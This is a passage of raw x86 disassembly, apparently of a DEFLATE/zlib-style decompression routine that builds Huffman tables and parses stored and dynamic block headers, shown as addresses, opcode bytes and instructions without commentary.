  406b9a:	8d 0c 8d 90 a0 46 00 	lea    0x46a090(,%ecx,4),%ecx
  406ba1:	3b f1                	cmp    %ecx,%esi
  406ba3:	72 06                	jb     0x406bab
  406ba5:	c6 45 60 c0          	movb   $0xc0,0x60(%ebp)
  406ba9:	eb 46                	jmp    0x406bf1
  406bab:	8b 0e                	mov    (%esi),%ecx
  406bad:	3b 4d 68             	cmp    0x68(%ebp),%ecx
  406bb0:	73 1c                	jae    0x406bce
  406bb2:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406bb8:	0f 92 c1             	setb   %cl
  406bbb:	fe c9                	dec    %cl
  406bbd:	80 e1 60             	and    $0x60,%cl
  406bc0:	88 4d 60             	mov    %cl,0x60(%ebp)
  406bc3:	66 8b 0e             	mov    (%esi),%cx
  406bc6:	83 c6 04             	add    $0x4,%esi
  406bc9:	89 75 38             	mov    %esi,0x38(%ebp)
  406bcc:	eb 1f                	jmp    0x406bed
  406bce:	2b 4d 68             	sub    0x68(%ebp),%ecx
  406bd1:	8b 55 70             	mov    0x70(%ebp),%edx
  406bd4:	8b 7d 24             	mov    0x24(%ebp),%edi
  406bd7:	03 c9                	add    %ecx,%ecx
  406bd9:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  406bdc:	80 c2 50             	add    $0x50,%dl
  406bdf:	83 45 38 04          	addl   $0x4,0x38(%ebp)
  406be3:	88 55 60             	mov    %dl,0x60(%ebp)
  406be6:	8b 55 6c             	mov    0x6c(%ebp),%edx
  406be9:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  406bed:	66 89 4d 62          	mov    %cx,0x62(%ebp)
  406bf1:	8b 4d 50             	mov    0x50(%ebp),%ecx
  406bf4:	8b 55 4c             	mov    0x4c(%ebp),%edx
  406bf7:	33 f6                	xor    %esi,%esi
  406bf9:	2b c8                	sub    %eax,%ecx
  406bfb:	46                   	inc    %esi
  406bfc:	d3 e6                	shl    %cl,%esi
  406bfe:	8b c8                	mov    %eax,%ecx
  406c00:	d3 ea                	shr    %cl,%edx
  406c02:	eb 08                	jmp    0x406c0c
  406c04:	8b 4d 60             	mov    0x60(%ebp),%ecx
  406c07:	89 0c 93             	mov    %ecx,(%ebx,%edx,4)
  406c0a:	03 d6                	add    %esi,%edx
  406c0c:	3b 55 28             	cmp    0x28(%ebp),%edx
  406c0f:	72 f3                	jb     0x406c04
  406c11:	8b 4d 30             	mov    0x30(%ebp),%ecx
  406c14:	8b 75 4c             	mov    0x4c(%ebp),%esi
  406c17:	33 d2                	xor    %edx,%edx
  406c19:	42                   	inc    %edx
  406c1a:	d3 e2                	shl    %cl,%edx
  406c1c:	eb 04                	jmp    0x406c22
  406c1e:	33 f2                	xor    %edx,%esi
  406c20:	d1 ea                	shr    $1,%edx
  406c22:	85 d6                	test   %edx,%esi
  406c24:	75 f8                	jne    0x406c1e
  406c26:	33 c9                	xor    %ecx,%ecx
  406c28:	41                   	inc    %ecx
  406c29:	33 f2                	xor    %edx,%esi
  406c2b:	8b d1                	mov    %ecx,%edx
  406c2d:	8b c8                	mov    %eax,%ecx
  406c2f:	d3 e2                	shl    %cl,%edx
  406c31:	89 75 4c             	mov    %esi,0x4c(%ebp)
  406c34:	4a                   	dec    %edx
  406c35:	23 d6                	and    %esi,%edx
  406c37:	8b ca                	mov    %edx,%ecx
  406c39:	8b 55 48             	mov    0x48(%ebp),%edx
  406c3c:	3b 4c 95 a4          	cmp    -0x5c(%ebp,%edx,4),%ecx
  406c40:	74 18                	je     0x406c5a
  406c42:	2b 45 54             	sub    0x54(%ebp),%eax
  406c45:	33 f6                	xor    %esi,%esi
  406c47:	46                   	inc    %esi
  406c48:	8b c8                	mov    %eax,%ecx
  406c4a:	d3 e6                	shl    %cl,%esi
  406c4c:	4a                   	dec    %edx
  406c4d:	4e                   	dec    %esi
  406c4e:	23 75 4c             	and    0x4c(%ebp),%esi
  406c51:	3b 74 95 a4          	cmp    -0x5c(%ebp,%edx,4),%esi
  406c55:	75 eb                	jne    0x406c42
  406c57:	89 55 48             	mov    %edx,0x48(%ebp)
  406c5a:	83 7d 2c 00          	cmpl   $0x0,0x2c(%ebp)
  406c5e:	0f 85 44 fe ff ff    	jne    0x406aa8
  406c64:	ff 45 50             	incl   0x50(%ebp)
  406c67:	83 45 34 04          	addl   $0x4,0x34(%ebp)
  406c6b:	8b 4d 50             	mov    0x50(%ebp),%ecx
  406c6e:	ff 45 30             	incl   0x30(%ebp)
  406c71:	3b 4d 40             	cmp    0x40(%ebp),%ecx
  406c74:	0f 8e 1f fe ff ff    	jle    0x406a99
  406c7a:	85 ff                	test   %edi,%edi
  406c7c:	74 06                	je     0x406c84
  406c7e:	83 7d 40 01          	cmpl   $0x1,0x40(%ebp)
  406c82:	75 0c                	jne    0x406c90
  406c84:	33 c0                	xor    %eax,%eax
  406c86:	5b                   	pop    %ebx
  406c87:	5f                   	pop    %edi
  406c88:	5e                   	pop    %esi
  406c89:	83 c5 58             	add    $0x58,%ebp
  406c8c:	c9                   	leave
  406c8d:	c2 20 00             	ret    $0x20
  406c90:	83 c8 ff             	or     $0xffffffff,%eax
  406c93:	eb f1                	jmp    0x406c86
  406c95:	55                   	push   %ebp
  406c96:	8b ec                	mov    %esp,%ebp
  406c98:	83 ec 40             	sub    $0x40,%esp
  406c9b:	8b 45 08             	mov    0x8(%ebp),%eax
  406c9e:	8b 08                	mov    (%eax),%ecx
  406ca0:	53                   	push   %ebx
  406ca1:	8d 58 10             	lea    0x10(%eax),%ebx
  406ca4:	8b 40 04             	mov    0x4(%eax),%eax
  406ca7:	8b 93 a8 9b 00 00    	mov    0x9ba8(%ebx),%edx
  406cad:	89 45 d0             	mov    %eax,-0x30(%ebp)
  406cb0:	8b 83 1c 05 00 00    	mov    0x51c(%ebx),%eax
  406cb6:	56                   	push   %esi
  406cb7:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  406cba:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  406cc0:	57                   	push   %edi
  406cc1:	8b bb 18 05 00 00    	mov    0x518(%ebx),%edi
  406cc7:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  406cca:	89 7d c8             	mov    %edi,-0x38(%ebp)
  406ccd:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  406cd0:	3b d0                	cmp    %eax,%edx
  406cd2:	73 05                	jae    0x406cd9
  406cd4:	2b c2                	sub    %edx,%eax
  406cd6:	48                   	dec    %eax
  406cd7:	eb 08                	jmp    0x406ce1
  406cd9:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  406cdf:	2b c2                	sub    %edx,%eax
  406ce1:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406ce4:	8b 03                	mov    (%ebx),%eax
  406ce6:	83 f8 0f             	cmp    $0xf,%eax
  406ce9:	0f 87 e1 09 00 00    	ja     0x4076d0
  406cef:	eb 03                	jmp    0x406cf4
  406cf1:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  406cf4:	ff 24 85 fd 77 40 00 	jmp    *0x4077fd(,%eax,4)
  406cfb:	8b 7d c8             	mov    -0x38(%ebp),%edi
  406cfe:	eb 23                	jmp    0x406d23
  406d00:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406d04:	0f 84 e9 09 00 00    	je     0x4076f3
  406d0a:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406d0d:	0f b6 00             	movzbl (%eax),%eax
  406d10:	ff 4d d0             	decl   -0x30(%ebp)
  406d13:	8b cf                	mov    %edi,%ecx
  406d15:	d3 e0                	shl    %cl,%eax
  406d17:	09 45 c4             	or     %eax,-0x3c(%ebp)
  406d1a:	ff 45 cc             	incl   -0x34(%ebp)
  406d1d:	83 c7 08             	add    $0x8,%edi
  406d20:	89 7d c8             	mov    %edi,-0x38(%ebp)
  406d23:	83 ff 03             	cmp    $0x3,%edi
  406d26:	72 d8                	jb     0x406d00
  406d28:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  406d2b:	c1 6d c4 03          	shrl   $0x3,-0x3c(%ebp)
  406d2f:	83 e0 07             	and    $0x7,%eax
  406d32:	8b c8                	mov    %eax,%ecx
  406d34:	80 e1 01             	and    $0x1,%cl
  406d37:	0f b6 c9             	movzbl %cl,%ecx
  406d3a:	83 ef 03             	sub    $0x3,%edi
  406d3d:	f7 d9                	neg    %ecx
  406d3f:	1b c9                	sbb    %ecx,%ecx
  406d41:	83 e1 07             	and    $0x7,%ecx
  406d44:	83 c1 08             	add    $0x8,%ecx
  406d47:	d1 e8                	shr    $1,%eax
  406d49:	33 f6                	xor    %esi,%esi
  406d4b:	2b c6                	sub    %esi,%eax
  406d4d:	89 7d c8             	mov    %edi,-0x38(%ebp)
  406d50:	89 8b 14 05 00 00    	mov    %ecx,0x514(%ebx)
  406d56:	0f 84 ec 00 00 00    	je     0x406e48
  406d5c:	48                   	dec    %eax
  406d5d:	74 1a                	je     0x406d79
  406d5f:	48                   	dec    %eax
  406d60:	74 0c                	je     0x406d6e
  406d62:	48                   	dec    %eax
  406d63:	0f 84 67 09 00 00    	je     0x4076d0
  406d69:	e9 54 09 00 00       	jmp    0x4076c2
  406d6e:	c7 03 0b 00 00 00    	movl   $0xb,(%ebx)
  406d74:	e9 49 09 00 00       	jmp    0x4076c2
  406d79:	80 3d 10 b2 46 00 00 	cmpb   $0x0,0x46b210
  406d80:	0f 85 9d 00 00 00    	jne    0x406e23
  406d86:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406d89:	b8 20 01 00 00       	mov    $0x120,%eax
  406d8e:	81 fe 8f 00 00 00    	cmp    $0x8f,%esi
  406d94:	b1 08                	mov    $0x8,%cl
  406d96:	7e 16                	jle    0x406dae
  406d98:	81 fe 00 01 00 00    	cmp    $0x100,%esi
  406d9e:	7d 04                	jge    0x406da4
  406da0:	fe c1                	inc    %cl
  406da2:	eb 0a                	jmp    0x406dae
  406da4:	81 fe 18 01 00 00    	cmp    $0x118,%esi
  406daa:	7d 02                	jge    0x406dae
  406dac:	b1 07                	mov    $0x7,%cl
  406dae:	0f be c9             	movsbl %cl,%ecx
  406db1:	89 0c b5 10 a5 46 00 	mov    %ecx,0x46a510(,%esi,4)
  406db8:	46                   	inc    %esi
  406db9:	3b f0                	cmp    %eax,%esi
  406dbb:	7c d1                	jl     0x406d8e
  406dbd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406dc0:	51                   	push   %ecx
  406dc1:	68 90 a9 46 00       	push   $0x46a990
  406dc6:	68 88 a0 46 00       	push   $0x46a088
  406dcb:	68 3c 8a 40 00       	push   $0x408a3c
  406dd0:	68 fc 89 40 00       	push   $0x4089fc
  406dd5:	68 01 01 00 00       	push   $0x101
  406dda:	50                   	push   %eax
  406ddb:	be 10 a5 46 00       	mov    $0x46a510,%esi
  406de0:	56                   	push   %esi
  406de1:	b8 c4 a0 40 00       	mov    $0x40a0c4,%eax
  406de6:	e8 82 fb ff ff       	call   0x40696d
  406deb:	6a 1e                	push   $0x1e
  406ded:	59                   	pop    %ecx
  406dee:	6a 05                	push   $0x5
  406df0:	58                   	pop    %eax
  406df1:	8b fe                	mov    %esi,%edi
  406df3:	f3 ab                	rep stos %eax,%es:(%edi)
  406df5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406df8:	50                   	push   %eax
  406df9:	68 90 a9 46 00       	push   $0x46a990
  406dfe:	68 8c a0 46 00       	push   $0x46a08c
  406e03:	68 b8 8a 40 00       	push   $0x408ab8
  406e08:	68 7c 8a 40 00       	push   $0x408a7c
  406e0d:	6a 00                	push   $0x0
  406e0f:	6a 1e                	push   $0x1e
  406e11:	56                   	push   %esi
  406e12:	b8 c8 a0 40 00       	mov    $0x40a0c8,%eax
  406e17:	e8 51 fb ff ff       	call   0x40696d
  406e1c:	c6 05 10 b2 46 00 01 	movb   $0x1,0x46b210
  406e23:	a0 c4 a0 40 00       	mov    0x40a0c4,%al
  406e28:	88 43 10             	mov    %al,0x10(%ebx)
  406e2b:	a0 c8 a0 40 00       	mov    0x40a0c8,%al
  406e30:	88 43 11             	mov    %al,0x11(%ebx)
  406e33:	a1 88 a0 46 00       	mov    0x46a088,%eax
  406e38:	89 43 14             	mov    %eax,0x14(%ebx)
  406e3b:	a1 8c a0 46 00       	mov    0x46a08c,%eax
  406e40:	89 43 18             	mov    %eax,0x18(%ebx)
  406e43:	e9 16 08 00 00       	jmp    0x40765e
  406e48:	8b cf                	mov    %edi,%ecx
  406e4a:	83 e1 07             	and    $0x7,%ecx
  406e4d:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  406e50:	2b f9                	sub    %ecx,%edi
  406e52:	89 7d c8             	mov    %edi,-0x38(%ebp)
  406e55:	c7 03 09 00 00 00    	movl   $0x9,(%ebx)
  406e5b:	e9 62 08 00 00       	jmp    0x4076c2
  406e60:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406e63:	eb 21                	jmp    0x406e86
  406e65:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406e69:	0f 84 84 08 00 00    	je     0x4076f3
  406e6f:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406e72:	0f b6 00             	movzbl (%eax),%eax
  406e75:	ff 4d d0             	decl   -0x30(%ebp)
  406e78:	d3 e0                	shl    %cl,%eax
  406e7a:	09 45 c4             	or     %eax,-0x3c(%ebp)
  406e7d:	ff 45 cc             	incl   -0x34(%ebp)
  406e80:	83 c1 08             	add    $0x8,%ecx
  406e83:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  406e86:	83 f9 10             	cmp    $0x10,%ecx
  406e89:	72 da                	jb     0x406e65
  406e8b:	0f b7 45 c4          	movzwl -0x3c(%ebp),%eax
  406e8f:	89 43 04             	mov    %eax,0x4(%ebx)
  406e92:	33 c0                	xor    %eax,%eax
  406e94:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406e97:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  406e9a:	39 43 04             	cmp    %eax,0x4(%ebx)
  406e9d:	74 05                	je     0x406ea4
  406e9f:	6a 0a                	push   $0xa
  406ea1:	58                   	pop    %eax
  406ea2:	eb 06                	jmp    0x406eaa
  406ea4:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  406eaa:	89 03                	mov    %eax,(%ebx)
  406eac:	e9 11 08 00 00       	jmp    0x4076c2
  406eb1:	33 f6                	xor    %esi,%esi
  406eb3:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  406eb6:	0f 84 37 08 00 00    	je     0x4076f3
  406ebc:	39 75 d8             	cmp    %esi,-0x28(%ebp)
  406ebf:	0f 85 96 00 00 00    	jne    0x406f5b
  406ec5:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  406ecb:	3b d1                	cmp    %ecx,%edx
  406ecd:	75 27                	jne    0x406ef6
  406ecf:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  406ed5:	8d 93 a0 1b 00 00    	lea    0x1ba0(%ebx),%edx
  406edb:	3b d0                	cmp    %eax,%edx
  406edd:	74 17                	je     0x406ef6
  406edf:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  406ee2:	73 08                	jae    0x406eec
  406ee4:	2b c2                	sub    %edx,%eax
  406ee6:	48                   	dec    %eax
  406ee7:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406eea:	eb 05                	jmp    0x406ef1
  406eec:	2b ca                	sub    %edx,%ecx
  406eee:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  406ef1:	39 75 d8             	cmp    %esi,-0x28(%ebp)
  406ef4:	75 65                	jne    0x406f5b
  406ef6:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406ef9:	8b 75 08             	mov    0x8(%ebp),%esi
  406efc:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  406f02:	e8 06 fa ff ff       	call   0x40690d
  406f07:	8b b3 a8 9b 00 00    	mov    0x9ba8(%ebx),%esi
  406f0d:	8b 8b a4 9b 00 00    	mov    0x9ba4(%ebx),%ecx
  406f13:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  406f16:	3b f1                	cmp    %ecx,%esi
  406f18:	73 07                	jae    0x406f21
  406f1a:	8b c1                	mov    %ecx,%eax
  406f1c:	2b c6                	sub    %esi,%eax
  406f1e:	48                   	dec    %eax
  406f1f:	eb 08                	jmp    0x406f29
  406f21:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  406f27:	2b c6                	sub    %esi,%eax
  406f29:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  406f2f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406f32:	3b f2                	cmp    %edx,%esi
  406f34:	75 1d                	jne    0x406f53
  406f36:	8d b3 a0 1b 00 00    	lea    0x1ba0(%ebx),%esi
  406f3c:	3b f1                	cmp    %ecx,%esi
  406f3e:	74 13                	je     0x406f53
  406f40:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  406f43:	73 07                	jae    0x406f4c
  406f45:	2b ce                	sub    %esi,%ecx
  406f47:	49                   	dec    %ecx
  406f48:	8b c1                	mov    %ecx,%eax
  406f4a:	eb 04                	jmp    0x406f50
  406f4c:	2b d6                	sub    %esi,%edx
  406f4e:	8b c2                	mov    %edx,%eax
  406f50:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406f53:	85 c0                	test   %eax,%eax
  406f55:	0f 84 cd 07 00 00    	je     0x407728
  406f5b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406f5e:	8b f0                	mov    %eax,%esi
  406f60:	3b 45 d0             	cmp    -0x30(%ebp),%eax
  406f63:	72 03                	jb     0x406f68
  406f65:	8b 75 d0             	mov    -0x30(%ebp),%esi
  406f68:	8b 43 04             	mov    0x4(%ebx),%eax
  406f6b:	3b c6                	cmp    %esi,%eax
  406f6d:	73 02                	jae    0x406f71
  406f6f:	8b f0                	mov    %eax,%esi
  406f71:	56                   	push   %esi
  406f72:	ff 75 cc             	push   -0x34(%ebp)
  406f75:	ff 75 d4             	push   -0x2c(%ebp)
  406f78:	e8 a0 ea ff ff       	call   0x405a1d
  406f7d:	01 75 cc             	add    %esi,-0x34(%ebp)
  406f80:	29 75 d0             	sub    %esi,-0x30(%ebp)
  406f83:	01 75 d4             	add    %esi,-0x2c(%ebp)
  406f86:	29 75 d8             	sub    %esi,-0x28(%ebp)
  406f89:	29 73 04             	sub    %esi,0x4(%ebx)
  406f8c:	0f 85 30 07 00 00    	jne    0x4076c2
  406f92:	e9 0d ff ff ff       	jmp    0x406ea4
  406f97:	8b 7d c8             	mov    -0x38(%ebp),%edi
  406f9a:	eb 21                	jmp    0x406fbd
  406f9c:	33 f6                	xor    %esi,%esi
  406f9e:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  406fa1:	0f 84 9e 07 00 00    	je     0x407745
  406fa7:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406faa:	0f b6 00             	movzbl (%eax),%eax
  406fad:	ff 4d d0             	decl   -0x30(%ebp)
  406fb0:	8b cf                	mov    %edi,%ecx
  406fb2:	d3 e0                	shl    %cl,%eax
  406fb4:	09 45 c4             	or     %eax,-0x3c(%ebp)
  406fb7:	ff 45 cc             	incl   -0x34(%ebp)
  406fba:	83 c7 08             	add    $0x8,%edi
  406fbd:	83 ff 0e             	cmp    $0xe,%edi
  406fc0:	72 da                	jb     0x406f9c
  406fc2:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  406fc5:	25 ff 3f 00 00       	and    $0x3fff,%eax
  406fca:	8b c8                	mov    %eax,%ecx
  406fcc:	83 e1 1f             	and    $0x1f,%ecx
  406fcf:	89 43 04             	mov    %eax,0x4(%ebx)
  406fd2:	80 f9 1d             	cmp    $0x1d,%cl
  406fd5:	0f 87 9d 07 00 00    	ja     0x407778
  406fdb:	25 e0 03 00 00       	and    $0x3e0,%eax
  406fe0:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  406fe5:	0f 87 8d 07 00 00    	ja     0x407778
  406feb:	c1 6d c4 0e          	shrl   $0xe,-0x3c(%ebp)
  406fef:	83 ef 0e             	sub    $0xe,%edi
  406ff2:	83 63 08 00          	andl   $0x0,0x8(%ebx)
  406ff6:	c7 03 0c 00 00 00    	movl   $0xc,(%ebx)
  406ffc:	eb 4e                	jmp    0x40704c
  406ffe:	8b 7d c8             	mov    -0x38(%ebp),%edi
  407001:	eb 4c                	jmp    0x40704f
  407003:	83 ff 03             	cmp    $0x3,%edi
  407006:	73 26                	jae    0x40702e
  407008:	33 f6                	xor    %esi,%esi
  40700a:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  40700d:	0f 84 32 07 00 00    	je     0x407745
  407013:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407016:	0f b6 00             	movzbl (%eax),%eax
  407019:	ff 4d d0             	decl   -0x30(%ebp)
  40701c:	8b cf                	mov    %edi,%ecx
  40701e:	d3 e0                	shl    %cl,%eax
  407020:	83 c7 08             	add    $0x8,%edi
  407023:	09 45 c4             	or     %eax,-0x3c(%ebp)
  407026:	ff 45 cc             	incl   -0x34(%ebp)
  407029:	83 ff 03             	cmp    $0x3,%edi
  40702c:	72 dc                	jb     0x40700a
  40702e:	8b 4b 08             	mov    0x8(%ebx),%ecx
  407031:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407034:	0f be 89 e8 89 40 00 	movsbl 0x4089e8(%ecx),%ecx
  40703b:	c1 6d c4 03          	shrl   $0x3,-0x3c(%ebp)
  40703f:	83 e0 07             	and    $0x7,%eax
  407042:	89 44 8b 0c          	mov    %eax,0xc(%ebx,%ecx,4)
  407046:	ff 43 08             	incl   0x8(%ebx)
  407049:	83 ef 03             	sub    $0x3,%edi
  40704c:	89 7d c8             	mov    %edi,-0x38(%ebp)
  40704f:	8b 43 04             	mov    0x4(%ebx),%eax
  407052:	c1 e8 0a             	shr    $0xa,%eax
  407055:	83 c0 04             	add    $0x4,%eax
  407058:	39 43 08             	cmp    %eax,0x8(%ebx)
  40705b:	72 a6                	jb     0x407003
  40705d:	6a 13                	push   $0x13
  40705f:	58                   	pop    %eax
  407060:	eb 12                	jmp    0x407074
  407062:	8b 4b 08             	mov    0x8(%ebx),%ecx
  407065:	0f be 89 e8 89 40 00 	movsbl 0x4089e8(%ecx),%ecx
  40706c:	83 64 8b 0c 00       	andl   $0x0,0xc(%ebx,%ecx,4)
  407071:	ff 43 08             	incl   0x8(%ebx)
  407074:	39 43 08             	cmp    %eax,0x8(%ebx)
  407077:	72 e9                	jb     0x407062
  407079:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40707c:	52                   	push   %edx
  40707d:	8d 93 20 05 00 00    	lea    0x520(%ebx),%edx
  407083:	52                   	push   %edx
  407084:	33 c9                	xor    %ecx,%ecx
  407086:	8d 93 10 05 00 00    	lea    0x510(%ebx),%edx
  40708c:	52                   	push   %edx
  40708d:	51                   	push   %ecx
  40708e:	51                   	push   %ecx
  40708f:	50                   	push   %eax
  407090:	50                   	push   %eax
  407091:	8d 43 0c             	lea    0xc(%ebx),%eax
  407094:	8d b3 0c 05 00 00    	lea    0x50c(%ebx),%esi
  40709a:	50                   	push   %eax
  40709b:	8b c6                	mov    %esi,%eax
  40709d:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  4070a3:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4070a6:	e8 c2 f8 ff ff       	call   0x40696d
  4070ab:	85 c0                	test   %eax,%eax
  4070ad:	75 12                	jne    0x4070c1
  4070af:	39 06                	cmp    %eax,(%esi)
  4070b1:	74 0e                	je     0x4070c1
  4070b3:	21 43 08             	and    %eax,0x8(%ebx)
  4070b6:	c7 03 0d 00 00 00    	movl   $0xd,(%ebx)
  4070bc:	e9 27 01 00 00       	jmp    0x4071e8
  4070c1:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  4070c7:	e9 f6 05 00 00       	jmp    0x4076c2
  4070cc:	8b 7d c8             	mov    -0x38(%ebp),%edi
  4070cf:	e9 14 01 00 00       	jmp    0x4071e8
  4070d4:	8b 83 0c 05 00 00    	mov    0x50c(%ebx),%eax
  4070da:	eb 21                	jmp    0x4070fd
  4070dc:	33 f6                	xor    %esi,%esi
  4070de:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  4070e1:	0f 84 5e 06 00 00    	je     0x407745
  4070e7:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4070ea:	0f b6 11             	movzbl (%ecx),%edx
  4070ed:	ff 4d d0             	decl   -0x30(%ebp)
  4070f0:	8b cf                	mov    %edi,%ecx
  4070f2:	d3 e2                	shl    %cl,%edx
  4070f4:	09 55 c4             	or     %edx,-0x3c(%ebp)
  4070f7:	ff 45 cc             	incl   -0x34(%ebp)
  4070fa:	83 c7 08             	add    $0x8,%edi
  4070fd:	3b f8                	cmp    %eax,%edi
  4070ff:	72 db                	jb     0x4070dc
  407101:	0f b7 04 45 a0 a0 40 	movzwl 0x40a0a0(,%eax,2),%eax
  407108:	00 
  407109:	23 45 c4             	and    -0x3c(%ebp),%eax
  40710c:	8b 8b 10 05 00 00    	mov    0x510(%ebx),%ecx
  407112:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  407115:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  407119:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40711d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407120:	83 f8 10             	cmp    $0x10,%eax
  407123:	73 16                	jae    0x40713b
  407125:	8b ca                	mov    %edx,%ecx
  407127:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  40712a:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40712d:	2b fa                	sub    %edx,%edi
  40712f:	89 44 8b 0c          	mov    %eax,0xc(%ebx,%ecx,4)
  407133:	ff 43 08             	incl   0x8(%ebx)
  407136:	e9 ad 00 00 00       	jmp    0x4071e8
  40713b:	83 f8 12             	cmp    $0x12,%eax
  40713e:	75 0c                	jne    0x40714c
  407140:	6a 07                	push   $0x7
  407142:	58                   	pop    %eax
  407143:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  40714a:	eb 2d                	jmp    0x407179
  40714c:	83 c0 f2             	add    $0xfffffff2,%eax
  40714f:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  407156:	eb 21                	jmp    0x407179
  407158:	33 f6                	xor    %esi,%esi
  40715a:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  40715d:	0f 84 e2 05 00 00    	je     0x407745
  407163:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  407166:	0f b6 31             	movzbl (%ecx),%esi
  407169:	ff 4d d0             	decl   -0x30(%ebp)
  40716c:	8b cf                	mov    %edi,%ecx
  40716e:	d3 e6                	shl    %cl,%esi
  407170:	09 75 c4             	or     %esi,-0x3c(%ebp)
  407173:	ff 45 cc             	incl   -0x34(%ebp)
  407176:	83 c7 08             	add    $0x8,%edi
  407179:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  40717c:	3b f9                	cmp    %ecx,%edi
  40717e:	72 d8                	jb     0x407158
  407180:	8b ca                	mov    %edx,%ecx
  407182:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  407185:	0f b7 0c 45 a0 a0 40 	movzwl 0x40a0a0(,%eax,2),%ecx
  40718c:	00 
  40718d:	23 4d c4             	and    -0x3c(%ebp),%ecx
  407190:	2b fa                	sub    %edx,%edi
  407192:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407195:	03 d1                	add    %ecx,%edx
  407197:	8b c8                	mov    %eax,%ecx
  407199:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  40719c:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40719f:	2b f8                	sub    %eax,%edi
  4071a1:	8b 43 04             	mov    0x4(%ebx),%eax
  4071a4:	8b f0                	mov    %eax,%esi
  4071a6:	c1 ee 05             	shr    $0x5,%esi
  4071a9:	83 e6 1f             	and    $0x1f,%esi
  4071ac:	83 e0 1f             	and    $0x1f,%eax
  4071af:	8d 84 06 02 01 00 00 	lea    0x102(%esi,%eax,1),%eax
  4071b6:	8d 34 0a             	lea    (%edx,%ecx,1),%esi
  4071b9:	3b f0                	cmp    %eax,%esi
  4071bb:	0f 87 b7 05 00 00    	ja     0x407778
  4071c1:	83 7d f4 10          	cmpl   $0x10,-0xc(%ebp)
  4071c5:	75 0f                	jne    0x4071d6
  4071c7:	83 f9 01             	cmp    $0x1,%ecx
  4071ca:	0f 82 a8 05 00 00    	jb     0x407778
  4071d0:	8b 74 8b 08          	mov    0x8(%ebx,%ecx,4),%esi
  4071d4:	eb 02                	jmp    0x4071d8
  4071d6:	33 f6                	xor    %esi,%esi
  4071d8:	8d 44 8b 0c          	lea    0xc(%ebx,%ecx,4),%eax
  4071dc:	89 30                	mov    %esi,(%eax)
  4071de:	41                   	inc    %ecx
  4071df:	83 c0 04             	add    $0x4,%eax
  4071e2:	4a                   	dec    %edx
  4071e3:	75 f7                	jne    0x4071dc
  4071e5:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4071e8:	8b 43 04             	mov    0x4(%ebx),%eax
  4071eb:	8b c8                	mov    %eax,%ecx
  4071ed:	c1 e9 05             	shr    $0x5,%ecx
  4071f0:	83 e1 1f             	and    $0x1f,%ecx
  4071f3:	83 e0 1f             	and    $0x1f,%eax
  4071f6:	8d 84 01 02 01 00 00 	lea    0x102(%ecx,%eax,1),%eax
  4071fd:	39 43 08             	cmp    %eax,0x8(%ebx)
  407200:	0f 82 ce fe ff ff    	jb     0x4070d4
  407206:	8b 43 04             	mov    0x4(%ebx),%eax
  407209:	83 a3 10 05 00 00 00 	andl   $0x0,0x510(%ebx)
